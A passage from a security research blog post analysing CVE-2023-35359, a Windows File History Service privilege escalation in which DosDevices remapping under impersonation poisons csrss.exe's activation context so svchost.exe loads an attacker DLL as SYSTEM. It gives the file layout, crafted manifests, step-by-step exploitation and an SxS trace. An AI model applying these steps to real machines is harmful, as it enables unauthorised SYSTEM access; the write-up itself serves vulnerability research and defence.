    PSXS_IMPERSONATION_CALLBACK ImpersonationCallback;
    PVOID                       ImpersonationContext;
    OUT HANDLE  SectionObjectHandle;
} SXS_GENERATE_ACTIVATION_CONTEXT_PARAMETERS, *PSXS_GENERATE_ACTIVATION_CONTEXT_PARAMETERS;

typedef struct _SXS_GENERATE_ACTIVATION_CONTEXT_STREAM
{
    IStream* Stream;
    PCWSTR  Path;
    ULONG   PathType;
} SXS_GENERATE_ACTIVATION_CONTEXT_STREAM;
```

As you can see from the **structure** definitions, the `SxsDllParameters` has `AssemblyDirectory`, `Manifest.Path` inside it.

When operations are performed on the `Manifest.Path`, effectively it can be **redirected** to a **different location** using the user's `DosDevices` **remapping**. This attack involves **remapping** `\??\C:` symbolic link to a path where the **low privileged** user has the **write access** like `\GLOBAL??\C:\Users\Public\test`.

Now, let's see what the overall process looks like:

```mermaid
graph TB
    subgraph "svchost.exe"
        IMPERSONATE["Impersonate Caller"] -- "1\nInitiates DLL Load" --> LOADLIBRARY_FHCFG["LoadLibrary('C:\Windows\System32\fhcfg.dll')"]
        LOADLIBRARY_FHCFG -- 2\nGenerate Activation Context --> SVCHOST_CREATEACTCTX["BasepCreateActCtx"]
        SVCHOST_CREATEACTCTX -- "7\nRead Activation Context" --> SVCHOST_ACTCTX["Activation Context"]
        LOADLIBRARY_FHCFG -- "8\nLoads DLL" --> DLL["C:\Windows\System32\fhcfg.dll"]
        LOADLIBRARY_MPR["LoadLibrary('C:\Windows\System32\mpr.dll')"] -- "9\nRead Activation Context" --> SVCHOST_ACTCTX
        LOADLIBRARY_MPR -- "10\nLoads DLL" --> LOADLIBRARY_CORRECT_MPR["C:\Windows\System32\mpr.dll"]
    end
    subgraph "csrss.exe"
        CSRSS_CREATEACTCTX["BaseSrvSxsCreateActivationContext"] -- 4\nImpersonate Caller --> F["SxsGenerateActivationContext"]
        F -- "5\nParse Manifest" --> CSRSS_DLL["C:\Windows\System32\fhcfg.dll"]
    end
    SVCHOST_CREATEACTCTX -- "3\nSend Message" --> CSRSS_CREATEACTCTX
    CSRSS_CREATEACTCTX -- "6\nPass Activation Context" --> SVCHOST_ACTCTX
```

## Exploitation

Let's see how we **File History Service LPE** **CVE-2023-35359** was exploited

To exploit this situation, we require the following things:

* Create this directory layout as shown below

```bash
C:\
├── FakeRoot
│   └── mpr.dll
└── Users
    └── Public
        └── test
            ├── FakeRoot
            │   └── FakeRoot.manifest
            └── Windows
                └── System32
                    ├── fhcfg.dll
                    └── Microsoft.Windows.Common-Controls.manifest
```

* Drop a fake `fhcfg.dll` that has the below given **fake manifest** embedded inside it

```xml
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
    <dependency>
        <dependentAssembly>
            <assemblyIdentity
                type="win32"
                name="..\..\..\..\..\..\FakeRoot\FakeRoot"
                version="1.0.0.0"
                processorArchitecture="amd64"
                publicKeyToken="6595b64144ccf1df"
                language="*"
            />
        </dependentAssembly>
    </dependency>
</assembly>
```

* Drop a fake **SxS manifest** to `C:\Users\Public\test\Windows\System32\Microsoft.Windows.Common-Controls.manifest`
  * This **manifest** is responsible for **redirecting** the load of `mpr.dll` to a fake location.

```xml
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
    <dependency>
        <dependentAssembly>
            <assemblyIdentity
                type="win32"
                name="..\..\..\..\..\..\FakeRoot\FakeRoot"
                version="1.0.0.0"
                processorArchitecture="amd64"
                publicKeyToken="6595b64144ccf1df"
                language="*"
            />
        </dependentAssembly>
    </dependency>
    <file name="mpr.dll" />
</assembly>
```

* Drop the fake `mpr.dll` **DLL** that will be loaded by `svchost.exe` when trying to load **dependencies**
* Create the **symbolic links**: `\??\C:` -> `\GLOBAL??\C:\Users\Public\test`
* Start the `fhsvc` service
* `svchost.exe` while **impersonating** the **caller**, calls `LoadLibrary`
* `LoadLibrary` will send a message to the `csrss.exe` process to generate the **Activation Context**
* `csrss.exe` while **impersonating** the **caller**, parses the **SxS manifest** of `fhcfg.dll`
* As **symbolic links** are already in place, `csrss.exe` will follow the **symbolic link**
* Now, it's parsing the **manifest** of the **fake** `C:\Users\Public\test\Windows\System32\fhcfg.dll`
* **Fake** `fhcfg.dll` installs a **fake** `dependency` on `..\..\..\..\..\..\FakeRoot\FakeRoot`
* `csrss.exe` will resolve the **fake** `dependency` and generate a **poisoned Activation Context** which **redirects** the load of `mpr.dll` from `C:\Windows\System32\mpr.dll` to `C:\FakeRoot\mpr.dll`
* This **poisoned Activation Context** is passed to `svchost.exe`
* Loading of `fhcfg.dll` in `svchost.exe` is now complete
* `svchost.exe` tries to load a dependency `C:\Windows\System32\mpr.dll`, **poisoned Activation Context** is used and now `mpr.dll` is being loaded from the directory we control `C:\FakeRoot\mpr.dll`

Let's see the trace from **Process Monitor** and understand how `csrss.exe` follows the **symbolic links**, **parses** a fake **DLL** with fake **SxS manifest**.

![CSRSS symlink follow 1](/images/activation-context-hell-dosdevices-remapping-attack-under-impersonation/csrss-symlink-follow-1.png)
![CSRSS symlink follow 2](/images/activation-context-hell-dosdevices-remapping-attack-under-impersonation/csrss-symlink-follow-2.png)

Let's see what the overall **exploitation** process would look like:

```mermaid
graph TB
    subgraph "svchost.exe"
        IMPERSONATE["Impersonate Caller"] -- "1\nInitiates DLL Load" --> LOADLIBRARY_FHCFG["LoadLibrary('C:\Windows\System32\fhcfg.dll')"]
        LOADLIBRARY_FHCFG -- 2\nGenerate Activation Context --> CREATEACTCTX["BasepCreateActCtx"]
        CREATEACTCTX -- "8\nRead Poisoned Activation Context" --> ACTCTX["Activation Context"]
        LOADLIBRARY_FHCFG -- "9\nLoads DLL" --> DLL["C:\Windows\System32\fhcfg.dll"]
        LOADLIBRARY_MPR["LoadLibrary('C:\Windows\System32\mpr.dll')"] -- "10\nRead Poisoned Activation Context" --> ACTCTX
        LOADLIBRARY_MPR -- "11\nLoads Fake DLL" --> LOADLIBRARY_FAKE_MPR["C:\FakeRoot\mpr.dll"]
    end
    subgraph "csrss.exe"
        CSRSS_CREATEACTCTX["BaseSrvSxsCreateActivationContext"] -- 4\nImpersonate Caller --> F["SxsGenerateActivationContext"]
        F -- "5\nParse Manifest" --> CSRSS_DLL["C:\Windows\System32\fhcfg.dll"]
        CSRSS_DLL -- "6\nFollow Symlink\nParse Fake Manifest" --> CSRSS_FAKE_FHCFG_DLL["C:\Users\Public\test\Windows\System32\fhcfg.dll"]
    end
    CREATEACTCTX -- "3\nSend Message" --> CSRSS_CREATEACTCTX
    CSRSS_CREATEACTCTX -- "7\nPass Poisoned Activation Context" --> ACTCTX
```

In this **Process Monitor** trace, we can see that one of the **DLL** loads is redirected to `C:\FakeRoot` which loads a fake **attacker-controlled** **DLL** inside `svchost.exe` running as `NT AUTHORITY\SYSTEM`.

![svchost.exe loading arbitrary DLL](/images/activation-context-hell-dosdevices-remapping-attack-under-impersonation/svchost-loading-arbitrary-dll.png)

On successful exploitation, we can launch `cmd.exe` running as `NT AUTHORITY\SYSTEM`.

![cmd.exe running as SYSTEM](/images/activation-context-hell-dosdevices-remapping-attack-under-impersonation/cmd-running-as-system.png)

## SxS Tracing

We can use **SxS** tracing to understand what is happening under the hood. Below is a sample trace that shows how a **fake manifest** was parsed.

```log
=================
Begin Activation Context Generation.
Input Parameter:
  Flags = 0
  ProcessorArchitecture = AMD64
  CultureFallBacks = en-US;en
  ManifestPath = C:\WINDOWS\System32\fhcfg.dll
  AssemblyDirectory = C:\WINDOWS\System32\
  Application Config File =
-----------------
INFO: Parsing Manifest File C:\WINDOWS\System32\fhcfg.dll.
  INFO: Manifest Definition Identity is Microsoft.Windows.FileHistory.Core.ConfigManager,processorArchitecture="amd64",type="win32",version="5.1.0.0".
  INFO: Reference: Microsoft.Windows.Common-Controls,language="&#x2a;",processorArchitecture="&#x2a;",publicKeyToken="6595b64144ccf1df",type="win32",version="6.0.0.0"
INFO: Resolving reference Microsoft.Windows.Common-Controls,language="&#x2a;",processorArchitecture="&#x2a;",publicKeyToken="6595b64144ccf1df",type="win32",version="6.0.0.0".
  INFO: Resolving reference for ProcessorArchitecture AMD64.
    INFO: Resolving reference for culture en-US.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\Microsoft.Windows.Common-Controls\6.0.0.0_en-US_6595b64144ccf1df\Microsoft.Windows.Common-Controls.DLL.
        INFO: Did not find manifest for culture en-US.
      INFO: End assembly probing.
    INFO: Resolving reference for culture en.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\Microsoft.Windows.Common-Controls\6.0.0.0_en_6595b64144ccf1df\Microsoft.Windows.Common-Controls.DLL.
        INFO: Did not find manifest for culture en.
      INFO: End assembly probing.
    INFO: Resolving reference for culture Neutral.
      INFO: Applying Binding Policy.
        INFO: Auto Servicing Policy redirected assembly version.
        INFO: Post policy assembly identity is Microsoft.Windows.Common-Controls,processorArchitecture="AMD64",publicKeyToken="6595b64144ccf1df",type="win32",version="6.0.22621.1635".
      INFO: Begin assembly probing.
        INFO: Attempt to probe manifest at C:\WINDOWS\WinSxS\manifests\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.22621.1635_none_270f70857386168e.manifest.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\Microsoft.Windows.Common-Controls\6.0.22621.1635__6595b64144ccf1df\Microsoft.Windows.Common-Controls.DLL.
        INFO: Attempt to probe manifest at C:\WINDOWS\System32\Microsoft.Windows.Common-Controls.DLL.
        INFO: Attempt to probe manifest at C:\WINDOWS\System32\Microsoft.Windows.Common-Controls.MANIFEST.
        INFO: Manifest found at C:\WINDOWS\System32\Microsoft.Windows.Common-Controls.MANIFEST.
      INFO: End assembly probing.
INFO: Resolving reference Microsoft.Windows.Common-Controls.mui,language="&#x2a;",processorArchitecture="AMD64",publicKeyToken="6595b64144ccf1df",type="win32",version="6.0.22621.1635".
  INFO: Resolving reference for ProcessorArchitecture AMD64.
    INFO: Resolving reference for culture en-US.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\Microsoft.Windows.Common-Controls.mui\6.0.22621.1635_en-US_6595b64144ccf1df\Microsoft.Windows.Common-Controls.mui.DLL.
        INFO: Did not find manifest for culture en-US.
      INFO: End assembly probing.
    INFO: Resolving reference for culture en.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\Microsoft.Windows.Common-Controls.mui\6.0.22621.1635_en_6595b64144ccf1df\Microsoft.Windows.Common-Controls.mui.DLL.
        INFO: Did not find manifest for culture en.
      INFO: End assembly probing.
INFO: Parsing Manifest File C:\WINDOWS\System32\Microsoft.Windows.Common-Controls.MANIFEST.
  INFO: Manifest Definition Identity is (null).
  INFO: Reference: ..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;FakeRoot&#x5c;FakeRoot,language="&#x2a;",processorArchitecture="amd64",publicKeyToken="6595b64144ccf1df",type="win32",version="1.0.0.0"
INFO: Resolving reference ..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;FakeRoot&#x5c;FakeRoot,language="&#x2a;",processorArchitecture="amd64",publicKeyToken="6595b64144ccf1df",type="win32",version="1.0.0.0".
  INFO: Resolving reference for ProcessorArchitecture amd64.
    INFO: Resolving reference for culture en-US.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\..\..\..\..\..\..\FakeRoot\FakeRoot\1.0.0.0_en-US_6595b64144ccf1df\..\..\..\..\..\..\FakeRoot\FakeRoot.DLL.
        INFO: Did not find manifest for culture en-US.
      INFO: End assembly probing.
    INFO: Resolving reference for culture en.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\..\..\..\..\..\..\FakeRoot\FakeRoot\1.0.0.0_en_6595b64144ccf1df\..\..\..\..\..\..\FakeRoot\FakeRoot.DLL.
        INFO: Did not find manifest for culture en.
      INFO: End assembly probing.
    INFO: Resolving reference for culture Neutral.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\..\..\..\..\..\..\FakeRoot\FakeRoot\1.0.0.0__6595b64144ccf1df\..\..\..\..\..\..\FakeRoot\FakeRoot.DLL.
        INFO: Attempt to probe manifest at C:\WINDOWS\System32\..\..\..\..\..\..\FakeRoot\FakeRoot.DLL.
        INFO: Attempt to probe manifest at C:\WINDOWS\System32\..\..\..\..\..\..\FakeRoot\FakeRoot.MANIFEST.
        INFO: Manifest found at C:\WINDOWS\System32\..\..\..\..\..\..\FakeRoot\FakeRoot.MANIFEST.
      INFO: End assembly probing.
INFO: Resolving reference ..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;FakeRoot&#x5c;FakeRoot.mui,language="&#x2a;",processorArchitecture="amd64",publicKeyToken="6595b64144ccf1df",type="win32",version="1.0.0.0".
  INFO: Resolving reference for ProcessorArchitecture amd64.
    INFO: Resolving reference for culture en-US.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\..\..\..\..\..\..\FakeRoot\FakeRoot.mui\1.0.0.0_en-US_6595b64144ccf1df\..\..\..\..\..\..\FakeRoot\FakeRoot.mui.DLL.
        INFO: Did not find manifest for culture en-US.
      INFO: End assembly probing.
    INFO: Resolving reference for culture en.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\..\..\..\..\..\..\FakeRoot\FakeRoot.mui\1.0.0.0_en_6595b64144ccf1df\..\..\..\..\..\..\FakeRoot\FakeRoot.mui.DLL.
        INFO: Did not find manifest for culture en.
      INFO: End assembly probing.
INFO: Parsing Manifest File C:\WINDOWS\System32\..\..\..\..\..\..\FakeRoot\FakeRoot.MANIFEST.
  INFO: Manifest Definition Identity is (null).
  INFO: Reference: ..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;FakeRoot&#x5c;FakeRoot,language="&#x2a;",processorArchitecture="amd64",publicKeyToken="6595b64144ccf1df",type="win32",version="1.0.0.0"
INFO: Resolving reference ..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;FakeRoot&#x5c;FakeRoot,language="&#x2a;",processorArchitecture="amd64",publicKeyToken="6595b64144ccf1df",type="win32",version="1.0.0.0".
  INFO: Resolving reference for ProcessorArchitecture amd64.
    INFO: Resolving reference for culture en-US.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\..\..\..\..\..\..\FakeRoot\FakeRoot\1.0.0.0_en-US_6595b64144ccf1df\..\..\..\..\..\..\FakeRoot\FakeRoot.DLL.
        INFO: Did not find manifest for culture en-US.
      INFO: End assembly probing.
    INFO: Resolving reference for culture en.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\..\..\..\..\..\..\FakeRoot\FakeRoot\1.0.0.0_en_6595b64144ccf1df\..\..\..\..\..\..\FakeRoot\FakeRoot.DLL.
        INFO: Did not find manifest for culture en.
      INFO: End assembly probing.
    INFO: Resolving reference for culture Neutral.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\..\..\..\..\..\..\FakeRoot\FakeRoot\1.0.0.0__6595b64144ccf1df\..\..\..\..\..\..\FakeRoot\FakeRoot.DLL.
        INFO: Attempt to probe manifest at C:\WINDOWS\System32\..\..\..\..\..\..\FakeRoot\FakeRoot.DLL.
        INFO: Attempt to probe manifest at C:\WINDOWS\System32\..\..\..\..\..\..\FakeRoot\FakeRoot.MANIFEST.
        INFO: Manifest found at C:\WINDOWS\System32\..\..\..\..\..\..\FakeRoot\FakeRoot.MANIFEST.
      INFO: End assembly probing.
INFO: Resolving reference ..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;FakeRoot&#x5c;FakeRoot.mui,language="&#x2a;",processorArchitecture="amd64",publicKeyToken="6595b64144ccf1df",type="win32",version="1.0.0.0".
  INFO: Resolving reference for ProcessorArchitecture amd64.
    INFO: Resolving reference for culture en-US.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\..\..\..\..\..\..\FakeRoot\FakeRoot.mui\1.0.0.0_en-US_6595b64144ccf1df\..\..\..\..\..\..\FakeRoot\FakeRoot.mui.DLL.
        INFO: Did not find manifest for culture en-US.
      INFO: End assembly probing.
    INFO: Resolving reference for culture en.
      INFO: Applying Binding Policy.
        INFO: No publisher policy found.
        INFO: No binding policy redirect found.
      INFO: Begin assembly probing.
        INFO: Did not find the assembly in WinSxS.
        INFO: Attempt to probe manifest at C:\WINDOWS\assembly\GAC_64\..\..\..\..\..\..\FakeRoot\FakeRoot.mui\1.0.0.0_en_6595b64144ccf1df\..\..\..\..\..\..\FakeRoot\FakeRoot.mui.DLL.
        INFO: Did not find manifest for culture en.
      INFO: End assembly probing.
INFO: Activation Context generation succeeded.
End Activation Context Generation.
```

## Patch

<https://twitter.com/tiraniddo/status/1699497747093807509>

For those interested in a detailed analysis of the patch, the researcher `y3a` has already provided an insightful breakdown. You can read about his findings at: [CVE-2023-35359 - Analysis](https://y3a.github.io/2023/08/24/cve-2023-35359/)

## Demo Video

<https://www.youtube.com/embed/QaoLpTBHERM>

## Further Reading

* [The Print Spooler Bug that Wasn't in the Print Spooler](https://www.youtube.com/watch?v=H03b0UaogVs)
* [SSD Advisory – File History Service (fhsvc.dll) Elevation of Privilege](https://ssd-disclosure.com/ssd-advisory-file-history-service-fhsvc-dll-elevation-of-privilege/)
* [Windows: System Drive Replacement During Impersonation EoP](https://bugs.chromium.org/p/project-zero/issues/detail?id=2451)
* [CVE-2023-35359 - Analysis](https://y3a.github.io/2023/08/24/cve-2023-35359/)
* [Activation Context Cache Poisoning - Exploiting Csrss For Privilege Escalation](https://www.zerodayinitiative.com/blog/2023/1/23/activation-context-cache-poisoning-exploiting-csrss-for-privilege-escalation)
* [Windows Drivers are True'ly Tricky](https://googleprojectzero.blogspot.com/2015/10/windows-drivers-are-truely-tricky.html)
* [DosDevices](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-ms-dos-device-names)
* [SxS Assemblies](https://learn.microsoft.com/en-us/windows/win32/sbscs/about-side-by-side-assemblies-)
* [Activation Context](https://learn.microsoft.com/en-us/windows/win32/sbscs/activation-contexts)
* [WinSxS](https://omnicognate.wordpress.com/2009/10/05/winsxs/)
b:[["$","div",null,{"className":"-mt-6","children":["$","$L18",null,{"className":"mb-8","children":["$","h1",null,{"className":"text-3xl md:text-4xl font-bold bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent","children":"Activation Context Hell - DosDevices Remapping Attack under Impersonation"}]}]}],["$","$L19",null,{"slug":"activation-context-hell-dosdevices-remapping-attack-under-impersonation","frontmatter":{"title":"Activation Context Hell - DosDevices Remapping Attack under Impersonation","date":"September 11, 2023","authors":["Ashfaq Ansari","Krishnakant Patil"],"excerpt":"The article delves into the complexities of the DosDevices remapping attack when carried out under impersonation. It sheds light on the nuances of activation context and how it plays a pivotal role in the exploitation process. (CVE-2023-35359)","tags":["activation context","dosdevices","impersonation","lpe","csrss","sxs assembly","windows exploitation","symbolic link","CVE-2015-1644","CVE-2022-22047","CVE-2022-37987","CVE-2022-37989","CVE-2023-35359"]},"content":"$1a","tocItems":[{"id":"overview","text":"Overview","depth":2},{"id":"dosdevices","text":"DosDevices","depth":2},{"id":"loadlibrary","text":"LoadLibrary","depth":2},{"id":"impersonation","text":"Impersonation","depth":2},{"id":"clientserver-runtime-subsystem-csrss","text":"Client/Server Runtime Subsystem (CSRSS)","depth":2},{"id":"side-by-side-assemblies","text":"Side-by-Side Assemblies","depth":3},{"id":"manifests","text":"Manifests","depth":3},{"id":"activation-context","text":"Activation Context","depth":3},{"id":"activation-context-cache","text":"Activation Context Cache","depth":3},{"id":"file-history-service---cve-2023-35359","text":"File History Service - CVE-2023-35359","depth":2},{"id":"bug-pattern","text":"Bug Pattern","depth":3},{"id":"the-vulnerability","text":"The Vulnerability","depth":3},{"id":"root-cause-analysis","text":"Root Cause Analysis","depth":2},{"id":"exploitation","text":"Exploitation","depth":2},{"id":"sxs-tracing","text":"SxS Tracing","depth":2},{"id":"patch","text":"Patch","depth":2},{"id":"demo-video","text":"Demo Video","depth":2},{"id":"further-reading","text":"Further Reading","depth":2}]}]]
10:null
14:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
f:null
17:{"metadata":[["$","title","0",{"children":"Activation Context Hell - DosDevices Remapping Attack under Impersonation | HackSys Inc Blog"}],["$","meta","1",{"name":"description","content":"The article delves into the complexities of the DosDevices remapping attack when carried out under impersonation. It sheds light on the nuances of activation context and how it plays a pivotal role in the exploitation process. (CVE-2023-35359)"}],["$","link","2",{"rel":"manifest","href":"/manifest.webmanifest","crossOrigin":"$undefined"}],["$","meta","3",{"name":"keywords","content":"activation context, dosdevices, impersonation, lpe, csrss, sxs assembly, windows exploitation, symbolic link, CVE-2015-1644, CVE-2022-22047, CVE-2022-37987, CVE-2022-37989, CVE-2023-35359"}],["$","meta","4",{"name":"script:ld+json","content":"{\"@context\":\"https://schema.org\",\"@type\":\"Article\",\"headline\":\"Activation Context Hell - DosDevices Remapping Attack under Impersonation\",\"datePublished\":\"2023-09-11T00:00:00.000Z\",\"author\":{\"@type\":\"Person\",\"name\":\"Ashfaq Ansari\"},\"description\":\"The article delves into the complexities of the DosDevices remapping attack when carried out under impersonation. It sheds light on the nuances of activation context and how it plays a pivotal role in the exploitation process. (CVE-2023-35359)\",\"publisher\":{\"@type\":\"Organization\",\"name\":\"HackSys Inc\",\"logo\":{\"@type\":\"ImageObject\",\"url\":\"https://hacksys.io/logo.svg\"}},\"url\":\"https://hacksys.io/blogs/activation-context-hell-dosdevices-remapping-attack-under-impersonation\",\"mainEntityOfPage\":{\"@type\":\"WebPage\",\"@id\":\"https://hacksys.io/blogs/activation-context-hell-dosdevices-remapping-attack-under-impersonation\"}}"}],["$","link","5",{"rel":"canonical","href":"https://hacksys.io/blogs/activation-context-hell-dosdevices-remapping-attack-under-impersonation"}],["$","meta","6",{"property":"og:title","content":"Activation Context Hell - DosDevices Remapping Attack under Impersonation"}],["$","meta","7",{"property":"og:description","content":"The article delves into the complexities of the DosDevices remapping attack when carried out under impersonation. It sheds light on the nuances of activation context and how it plays a pivotal role in the exploitation process. (CVE-2023-35359)"}],["$","meta","8",{"property":"og:url","content":"https://hacksys.io/blogs/activation-context-hell-dosdevices-remapping-attack-under-impersonation"}],["$","meta","9",{"property":"og:type","content":"article"}],["$","meta","10",{"property":"article:published_time","content":"2023-09-11T00:00:00.000Z"}],["$","meta","11",{"property":"article:author","content":"Ashfaq Ansari"}],["$","meta","12",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","13",{"name":"twitter:title","content":"Activation Context Hell - DosDevices Remapping Attack under Impersonation"}],["$","meta","14",{"name":"twitter:description","content":"The article delves into the complexities of the DosDevices remapping attack when carried out under impersonation. It sheds light on the nuances of activation context and how it plays a pivotal role in the exploitation process. (CVE-2023-35359)"}]],"error":null,"digest":"$undefined"}
12:{"metadata":"$17:metadata","error":null,"digest":"$undefined"}
